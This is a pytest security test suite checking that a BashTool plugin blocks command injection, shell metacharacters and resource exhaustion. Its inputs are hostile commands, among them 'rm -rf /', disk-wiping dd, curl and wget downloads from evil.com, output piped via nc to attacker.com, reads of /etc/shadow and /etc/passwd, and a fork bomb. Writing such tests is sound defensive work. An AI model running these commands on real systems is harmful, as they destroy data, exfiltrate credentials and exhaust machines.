"""
Security tests for Command Injection vulnerability (Attack #1 & #5).

These tests verify that the fixes in tool_bash.py prevent
arbitrary command execution and resource exhaustion attacks.

Attack #1 CVSS Score: 9.8 (CRITICAL) - Arbitrary Code Execution
Attack #5 CVSS Score: 7.1 (HIGH) - Denial of Service
CWE-78: Improper Neutralization of Special Elements used in an OS Command
"""

import pytest
import asyncio
from plugins.tool_bash import BashTool


class TestCommandWhitelist:
    """Test suite for command whitelist enforcement."""
    
    @pytest.fixture
    def bash_tool(self):
        """Create a BashTool instance."""
        tool = BashTool()
        tool.setup({"timeout": 5})
        return tool
    
    @pytest.mark.asyncio
    async def test_dangerous_rm_blocked(self, bash_tool):
        """Test that 'rm' commands are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("rm -rf /")
        assert code == -1
        assert "SecurityError" in stderr
        assert "dangerous pattern" in stderr.lower()
    
    @pytest.mark.asyncio
    async def test_dangerous_dd_blocked(self, bash_tool):
        """Test that 'dd' commands are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("dd if=/dev/zero of=/dev/sda")
        assert code == -1
        assert "SecurityError" in stderr
        assert "dangerous pattern" in stderr.lower()
    
    @pytest.mark.asyncio
    async def test_curl_download_blocked(self, bash_tool):
        """Test that curl downloads are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("curl http://evil.com/backdoor.sh")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_wget_download_blocked(self, bash_tool):
        """Test that wget downloads are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("wget http://evil.com/malware")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_sudo_blocked(self, bash_tool):
        """Test that sudo commands are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("sudo cat /etc/shadow")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_pipe_chaining_blocked(self, bash_tool):
        """Test that command chaining with pipes is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("ls | nc attacker.com 1234")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_command_substitution_blocked(self, bash_tool):
        """Test that command substitution is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("echo $(cat /etc/passwd)")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_safe_ls_allowed(self, bash_tool):
        """Test that safe 'ls' command is allowed."""
        code, stdout, stderr = await bash_tool.execute_command("ls")
        assert code == 0
    
    @pytest.mark.asyncio
    async def test_safe_cat_allowed(self, bash_tool):
        """Test that safe 'cat' command is allowed."""
        # Create a test file first
        code, stdout, stderr = await bash_tool.execute_command("echo test")
        assert code == 0
    
    @pytest.mark.asyncio
    async def test_safe_git_status_allowed(self, bash_tool):
        """Test that safe 'git status' is allowed."""
        code, stdout, stderr = await bash_tool.execute_command("git status")
        # May fail if not in git repo, but should not be blocked for security
        assert "SecurityError" not in stderr
    
    @pytest.mark.asyncio
    async def test_safe_pytest_allowed(self, bash_tool):
        """Test that 'pytest' command is allowed."""
        code, stdout, stderr = await bash_tool.execute_command("pytest --version")
        # Should not be blocked (may fail if pytest not installed, that's ok)
        assert "SecurityError" not in stderr
    
    @pytest.mark.asyncio
    async def test_python_allowed(self, bash_tool):
        """Test that 'python' command is allowed."""
        code, stdout, stderr = await bash_tool.execute_command("python --version")
        # Should not be blocked
        assert "SecurityError" not in stderr
    
    @pytest.mark.asyncio
    async def test_python_code_injection_blocked(self, bash_tool):
        """Test that python -c code injection is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("python -c 'import os; os.system(\"ls\")'")
        assert code == -1
        assert "SecurityError" in stderr
        assert " -c " in stderr.lower() or "dangerous pattern" in stderr.lower()
    
    @pytest.mark.asyncio
    async def test_python_temp_file_blocked(self, bash_tool):
        """Test that executing python files from /tmp is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("python3 /tmp/malicious.py")
        assert code == -1
        assert "SecurityError" in stderr
        assert "/tmp/" in stderr.lower() or "dangerous pattern" in stderr.lower()
    
    @pytest.mark.asyncio
    async def test_bash_c_injection_blocked(self, bash_tool):
        """Test that bash -c injection is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("bash -c 'rm -rf /'")
        assert code == -1
        assert "SecurityError" in stderr


class TestResourceExhaustionPrevention:
    """Test suite for resource exhaustion prevention."""
    
    @pytest.fixture
    def bash_tool(self):
        """Create a BashTool with short timeout."""
        tool = BashTool()
        tool.setup({"timeout": 2})
        return tool
    
    @pytest.mark.asyncio
    async def test_fork_bomb_blocked(self, bash_tool):
        """Test that fork bomb patterns are blocked."""
        code, stdout, stderr = await bash_tool.execute_command(":(){ :|:& };:")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_infinite_loop_timeout(self, bash_tool):
        """Test that infinite loops hit timeout."""
        # Even if command was allowed, timeout should stop it
        # Using 'yes' which is not in whitelist, so will be blocked anyway
        code, stdout, stderr = await bash_tool.execute_command("yes")
        assert code == -1
    
    @pytest.mark.asyncio
    async def test_dev_random_blocked(self, bash_tool):
        """Test that /dev/random writes are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("cat /dev/random > /dev/sda")
        assert code == -1
        assert "SecurityError" in stderr


class TestShellMetacharacterPrevention:
    """Test suite for shell metacharacter blocking."""
    
    @pytest.fixture
    def bash_tool(self):
        """Create a BashTool instance."""
        tool = BashTool()
        tool.setup({})
        return tool
    
    @pytest.mark.asyncio
    async def test_ampersand_chaining_blocked(self, bash_tool):
        """Test that && command chaining is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("ls && cat /etc/passwd")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_semicolon_chaining_blocked(self, bash_tool):
        """Test that ; command chaining is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("ls ; cat /etc/passwd")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_backtick_substitution_blocked(self, bash_tool):
        """Test that backtick command substitution is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("echo `whoami`")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_redirect_blocked(self, bash_tool):
        """Test that output redirection is blocked."""
        code, stdout, stderr = await bash_tool.execute_command("echo malicious > /etc/passwd")
        assert code == -1
        assert "SecurityError" in stderr
    
    @pytest.mark.asyncio
    async def test_git_with_pipe_blocked(self, bash_tool):
        """Test that git commands with pipes are blocked."""
        code, stdout, stderr = await bash_tool.execute_command("git log --pretty=format:'%H' | head")
        assert code == -1
        assert "SecurityError" in stderr
        assert "|" in stderr.lower() or "metacharacter" in stderr.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
